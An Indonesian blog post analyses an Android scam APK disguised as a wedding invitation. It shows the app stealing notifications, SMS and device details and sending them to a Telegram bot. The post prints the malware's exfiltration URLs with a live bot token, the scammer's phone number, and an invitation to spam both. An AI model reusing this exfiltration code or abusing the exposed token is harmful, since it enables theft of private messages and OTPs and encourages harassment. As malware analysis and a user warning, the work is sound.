---
layout: "post"
title: "Membongkar dan Menganalisis APK Penipuan Undangan Pernikahan"
permalink: /blog/:title
toc: true
categories: blog
tags: reverse-engineering programming android
description: "Pernah mendapat kiriman APK dari Whatsapp dengan nama undangan pernikahan? cek paket? Jangan sembarangan menginstal APK kiriman dari orang lain. Selalu cek dan <i>recheck</i> kembali. Disini saya akan mencoba membongkar aplikasi penipuan berkedok undangan pernikahan."
---

<img src="https://i.ibb.co/2y3CZx0/app-scam-1.png" class="img-fluid center m-1">

# Reverse Engineering

APK (_Android Package Kit_) adalah format aplikasi untuk android. Sama saja seperti `.exe` pada Windows dan `.dmg` pada MacOS. Aplikasi seperti ini telah melalui proses yang dinamakan dengan _compile_, dimana baris - baris kode diterjemahkan menjadi bahasa mesin (_biner_) agar dapat dimengerti oleh perangkat komputer. Setelah melalui proses ini, kode aplikasi tidak dapat lagi dibaca dengan bahasa manusia. Namun, ada cara jika ingin mengetahui kode dibalik aplikasi yang sudah di\-_compile_ yaitu dengan [_reverse engineering_](https://id.wikipedia.org/wiki/Rekayasa_balik).

## Menginstall aplikasi di Emulator

Saya mendapatkan aplikasi undangan pernikahan ini dari grup Whatsapp. Sudah lama saya ingin sekali melakukan _reverse engineering_ terhadap aplikasi semacam ini. Tapi sebelum membongkar, saya coba install aplikasinya dulu di emulator. Tetapi setelah diinstal, aplikasi tersebut tidak muncul dimenu.

<img src="https://i.ibb.co/YN0ccj7/app-scam-1.png" class="img-fluid center m-1 img-long">

Setelah saya cek di pengaturan, ternyata aplikasi tersebut tidak memiliki nama.

<img src="https://i.ibb.co/myZ4pcf/app-scam-3.png" class="img-fluid center m-1 img-long">

## Mulai membongkar

Oke, langsung saja. Disini saya sudah membongkar aplikasi menggunakan tools `dex2jar`dan`jd-gui`. Setelah memilah - milah file, saya mengumpulkan file dibawah ini.

<img src="https://i.ibb.co/bWBM8p2/app-scam-4.png" class="img-fluid center m-1">

### AndroidManifest.xml

File Android Manifest sendiri berisi informasi mengenai aplikasi android itu sendiri, meliputi _icon_, _activity_, _intent_, _service_, _broadcast receiver_, dll. Namun yang paling penting dari Android Manifest ini adalah izin aplikasi. Mari kita lihat izin aplikasi dari aplikasi penipuan ini :

<img src="https://i.ibb.co/V2wmDzw/app-scam-5.png" class="img-fluid center m-1">

Sangat disayangkan, sepertinya Android Manifest tersebut _corrupt_, tapi sebagian besar izin aplikasinya masih bisa dibaca. Mari kita bongkar satu per satu.

1. WAKE_LOCK
   <img src="https://i.ibb.co/yftdLdV/app-scam-6.png" class="img-fluid center m-1" >
   Memberikan izin aplikasi untuk menjaga prosesor agar tidak tidur atau layar tidak meredup. [Selengkapnya](https://developer.android.com/reference/android/Manifest.permission#WAKE_LOCK)

2. BIND_NOTIFICATION_LISTENER_SERVICE, INTERNET, READ_SMS, FOREGROUND SERVICE, & RECEIVE_BOOT_COMPLETED

   <img src="https://i.ibb.co/c6txCw9/app-scam-7.png" class="img-fluid center m-1" >

   - BIND NOTIFICATION LISTENER SERVICE : Memberikan izin aplikasi untuk mengikat _service_ penerima notifikasi baru atau notifikasi yang dihapus. [Selengkapnya](https://developer.android.com/reference/android/Manifest.permission#BIND_NOTIFICATION_LISTENER_SERVICE)
   - INTERNET : Memberikan izin aplikasi untuk mengakses internet. [Selengkapnya](https://developer.android.com/reference/android/Manifest.permission#INTERNET)
   - READ SMS : Memberikan izin aplikasi untuk membaca SMS. [Selengkapnya](https://developer.android.com/reference/android/Manifest.permission#READ_SMS)
   - FOREGROUND SERVICE : Memberikan izin aplikasi untuk berjalan sebagai _foreground service_ . [Selengkapnya](https://developer.android.com/reference/android/Manifest.permission#FOREGROUND_SERVICE)
   - RECEIVE BOOT COMPLETED : Memberikan izin aplikasi untuk menerima status perangkat ketika pertama kali dihidupkan. [Selengkapnya](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)

3. ACCESS_NETWORK_STATE
   <img src="https://i.ibb.co/3fgxGz0/app-scam-8.png" class="img-fluid center m-1">
   Memberikan izin aplikasi untuk dapat membaca informasi tentang jaringan perangkat. [Selengkapnya](https://developer.android.com/reference/android/Manifest.permission#ACCESS_NETWORK_STATE)

4. RECEIVE_SMS
   <img src="https://i.ibb.co/FgP8NsX/app-scam-9.png" class="img-fluid center m-1">
   Memberikan izin aplikasi untuk menerima SMS diperangkat. [Selengkapnya](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_SMS)

### MainActivity.java

Selanjutnya adalah file Main Activity. Main Activity adalah aktivitas pertama yang akan dijalankan oleh Android ketika aplikasi dibuka. Kita lihat pada bagian fungsi `onCreate`. Fungsi `onCreate` akan selalu dipanggil pertama kali saat aplikasi dibuka.

<img src="https://i.ibb.co/TKjkxJH/app-scam-10.png" class="img-fluid center m-1" >

Pada baris 80 - 88 aplikasi akan menampilkan _webview_ yang mengarah ke _url_ kosong. Selanjutnya pada baris 94 - 99 aplikasi akan meminta izin kepada _user_ untuk menerima & mengirim SMS. Selanjutnya, aplikasi akan meminta izin membaca notifikasi perangkat.

<div class="flex flex-gap justify-center align-items-center m-1 center">
    <div class="img-long">
        <img src="https://i.ibb.co/R0NM9kx/app-scam-11.png" class="img-fluid">
    </div>
    <div class="img-long">
        <img src="https://i.ibb.co/KcgWtzN/app-scam-12.png" class="img-fluid">
    </div>
</div>

Jika _user_ mengizinkan, maka aplikasi akan mengirimkan sebuah pesan melalui bot api telegram berisi informasi tipe perangkat dengan pesan :

```
    https://api.telegram.org/bot6786269059:AAE5kJhf3LIHOVNWjjinjStyEzwzFQWysVk/sendMessage?parse_mode=markdown&chat_id=6648398269&text=𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐀𝐩𝐥𝐢𝐤𝐚𝐬𝐢 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 \n 𝐓𝐲𝐩𝐞 𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭: _
```

Perhatikan kode dibawah ini dibaris 109 - 112. Kemudian aplikasi akan mengirimkan _request_ API menggunakan `OKHttpClient` dibaris 114.

<img src="https://i.ibb.co/sK3z69x/app-scam-13.png" class="img-fluid center m-1">

{% include alerts.html type="info" content="Variabel <i>this.client</i> pada baris 114 berisi <i>OKHttpClient</i>, yaitu library untuk mengirim request API." %}

Berikutnya, aplikasi melakukan _checking_ pertama dengan mengirim pesan SMS "_Gacor123_" ke nomor _085382537448_ dibaris 127. Dan jika pesan gagal terkirim, maka aplikasi juga akan mengirimkan pesan _error_ ke bot api telegram seperti diatas.

<img src="https://i.ibb.co/P6B4DRS/app-scam-14.png" class="img-fluid center m-1">

{% include alerts.html type="info" content="Disini saya tidak akan melakukan sensor data sensitif penipu. Jadi silahkan saja spam nomor hpnya atau spam menggunakan bot api telegram dengan token yang sudah saya 'telanjangi' 😂." %}

_Checking_ yang kedua yaitu aplikasi mengecek apakah _user_ sudah mengizinkan aplikasi untuk membaca notifikasi perangkat. Jika _user_ belum mengizinkan, maka aplikasi akan mengalihkan ke halaman pengaturan izin notifikasi untuk memaksa _user_ mengaktifkan izin tersebut. Perhatikan dibaris 149 - 151.

<img src="https://i.ibb.co/V92pDTZ/app-scam-15.png" class="img-fluid center m-1">

Jika user mengizinkan, maka aplikasi akan me\-_register receiver_ menggunakan [Local Broadcast Manager](https://developer.android.com/reference/androidx/localbroadcastmanager/content/LocalBroadcastManager) dengan Intent filter "**Msg**" dan [Broadcaster Receiver](https://developer.android.com/guide/components/broadcasts?hl=id) `onNotice` di baris 153. Di bawah ini merupakan variable Broadcaster Receiver `onNotice`.

<img src="https://i.ibb.co/tYc5RT7/app-scam-18.png" class="img-fluid center m-1">

`onNotice` akan menerima pesan (_Intent_) yang dikirimkan dari `NotificationService.java` (penjelasan ada dibawah) yang kemudian akan mengirim pesan kembali ke bot api telegram.

{% include alerts.html type="info" content="<b>Local Broadcast Manager</b> adalah bagian dari <i>library</i> android yang menyediakan mekanisme untuk mengirim dan menerima pesan atau <i>broadcast</i> antar komponen hanya di dalam aplikasi." %}

{% include alerts.html type="info" content="<b>Broadcast Receiver</b> adalah salah satu komponen dasar dalam aplikasi Android yang berfungsi untuk menangkap dan merespon pesan atau <i>broadcast</i> yang dikirimkan oleh aplikasi maupun sistem." %}

### NotificationService.java

File ini berisi _service_ yang di\-_extend_ dari [Notification Listener Service](https://developer.android.com/reference/android/service/notification/NotificationListenerService) yang berfungsi untuk memberi tahu aplikasi bahwa ada notifikasi yang muncul di perangkat. Fungsi `onNotificationPosted` akan dipanggil ketika ada notifikasi baru yang muncul di perangkat dan memberikan akses ke objek `StatusBarNotification`, yang berisi informasi tentang notifikasi tersebut.

<img src="https://i.ibb.co/BCsC7p9/app-scam-16.png" class="img-fluid center m-1">

Jika ada notifikasi muncul, seketika aplikasi penipu ini akan mencatat **nama paket** aplikasi yang mengirimkan notifikasi, beserta **judul**, **isi**, dan **id** notifikasi. Yang selanjutnya akan dikirimkan melalui [Local Broadcaster Manager](https://developer.android.com/reference/androidx/localbroadcastmanager/content/LocalBroadcastManager) dengan nama Intent "**Msg**".

<img src="https://i.ibb.co/n0PGTWn/app-scam-17.png" class="img-fluid center m-1">

Jika diurutkan, maka prosesnya akan menjadi grafik seperti dibawah ini.

<img alt="Grafik pengiriman notifikasi" src="https://i.ibb.co/FqqRkGF/app-scam-diag-1.webp" class="img-fluid center m-1" >

Lalu saya coba dengan mengirimkan panggilan palsu di emulator.

<img src="https://i.ibb.co/QjLYjMB/app-scam-19.png" class="img-fluid center m-1">

Lalu saya _sniffing_ dengan menggunakan `mitmproxy`, inilah hasilnya.

- Request
  <img src="https://i.ibb.co/JHMtm5X/app-scam-20.png" class="img-fluid center m-1">

- Response
  <img src="https://i.ibb.co/s5ZY23B/app-scam-21.png" class="img-fluid center m-1">

Dan ternyata botnya masih aktif.

### ReceiveSms.java

File Recive SMS ini berisi _service_ yang di-_extends_ dari Broadcaster Receiver. Fungsi `onReceived` akan dipanggil jika ada pesan atau _broadcast_ dari aplikasi atau sistem dikirimkan. Diaplikasi ini, fungsi `onReceived` akan dipanggil ketika ada pesan SMS masuk. Perhatikan dibaris 24.

<img src="https://i.ibb.co/vQ10gWb/app-scam-22.png" class="img-fluid center m-1">

Jika ada SMS masuk, aplikasi akan membaca isi pesan. Kemudian aplikasi akan mengumpulkan info seputar perangkat, mulai dari BUILD ID, USER, PRODUCT, dll dibaris 37.

```java
stringBuilder2
	.append("ID : ")
	.append(Build.ID)
	.append("\n - User : ")
	.append(Build.USER)
	.append(str)
	.append(Build.PRODUCT)
	.append("\n - Brand : ")
	.append(Build.BRAND)
	.append("\n - Board : ")
	.append(Build.BOARD)
	.append("\n - BOOTLOADER : ")
	.append(Build.BOOTLOADER)
	.append("\n - DISPLAY : ")
	.append(Build.DISPLAY)
	.append("\n - HOST : ")
	.append(Build.HOST)
	.append("\n - DEVICE : ")
	.append(Build.DEVICE)
	.append("\n -TAGS : ")
	.append(Build.TAGS)
	.append("\n - FINGERPRINT : ")
	.append(Build.FINGERPRINT)
	.append("\n - TYPE : ")
	.append(Build.TYPE)
	.append(str)
	.append(Build.TIME)
	.append("\n - ")
	.toString();
```

<img src="https://i.ibb.co/5LGV15f/app-scam-23.png" class="img-fluid center m-1">

Setelah mengirimkan informasi, aplikasi akan mengirimkan no pengirim SMS, isi SMS dan info perangkat yang sudah dikumpulkan tadi.

```
https://api.telegram.org/bot6786269059:AAE5kJhf3LIHOVNWjjinjStyEzwzFQWysVk/sendMessage?parse_mode=markdown&chat_id=6648398269&text=𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 %0A %0A𝐒𝐞𝐧𝐝𝐞𝐫 : _").append(str1).append("_,%0A𝐌𝐞𝐬𝐬𝐚𝐠𝐞 : _\n\n").append(str2).append("%0A %0A𝐓𝐲𝐩𝐞 𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭 : "
```

- Request
  <img src="https://i.ibb.co/SXw7jxQ/app-scam-24.png" class="img-fluid center m-1" >

- Response
  <img src="https://i.ibb.co/pd075w2/app-scam-25.png" class="img-fluid center m-1" >

- Full Response Body

  ```json
  {
    "ok": true,
    "result": {
      "message_id": 25542,
      "from": {
        "id": 6786269059,
        "is_bot": true,
        "first_name": "Pencari ikan gabuss",
        "username": "Kskskskkskskkdkskd_bot"
      },
      "chat": {
        "id": 6648398269,
        "first_name": "Anak",
        "last_name": "Muda",
        "type": "private"
      },
      "date": 1701826905,
      "text": "𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 \n \n𝐒𝐞𝐧𝐝𝐞𝐫 : 6505551212,\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞 : Hello!\n \n𝐓𝐲𝐩𝐞 𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭 : unknown Android SDK built for x86",
      "entities": [
        {
          "offset": 49,
          "length": 10,
          "type": "italic"
        },
        {
          "offset": 78,
          "length": 72,
          "type": "italic"
        }
      ]
    }
  }
  ```

### SendSMS.java

File ini berisi sama dengan `ReceiveSms.java` yaitu _service_ yang di-_extend_ dari Broadcast Receiver. Meski sama - sama memiliki _trigger_ saat ada SMS masuk, tetapi file ini berfungsi untuk mengirim pesan SMS ke nomor tertentu seperti dibaris 55. Dan jika SMS tersebut berhasil terkirim, maka akan mengirimkan pesan ke bot API telegram di baris 65.

<img src="https://i.ibb.co/BtkL0v7/app-scam-26.png" class="img-fluid center m-1">

# Kesimpulan

Setelah membongkar dan menganalisis aplikasi penipuan ini, kita dapat menyimpulkan bahwa aplikasi semacam ini akan mencuri data - data sensitif mulai dari rincian perangkat, notifikasi (apapun tidak terkecuali, termasuk juga notifikasi chat pribadi _whatsapp_), dan pesan SMS (Si penipu mengincar OTP bank atau aplikasi penting lainnya). Nggak kebayang kan kalo _chat_ bucinan kita sama doi dibaca diam - diam oleh orang lain? 😱 😱 😱.

Oleh karena itu, beberapa hal yang dapat saya rekomendasikan untuk menghindari hal semacam ini adalah :

1. Jangan sembarangan menginstal aplikasi dari pihak yang tidak dipercaya.
2. Nonaktifkan izin "instal aplikasi tidak dikenal" untuk _whatsapp_.
   <img src="https://i.ibb.co/cTXyCQK/app-scam-27.png" class="img-fluid center m-1 img-long">
3. Selalu cek daftar aplikasi yang terinstal. Jika ada aplikasi yang mencurigakan, langsung _uninstall_ saja.

# Bonus

Spam dikit boleh kali yaaaa 🤣 🤣 🤣.

<div style="width:100%;height:0px;position:relative;padding-bottom:52.812%;margin-top:10px">
    <iframe src="https://streamable.com/e/0bd0nq?autoplay=1" frameborder="0" width="100%" height="100%" allowfullscreen allow="autoplay" style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden;">
    </iframe>
</div>
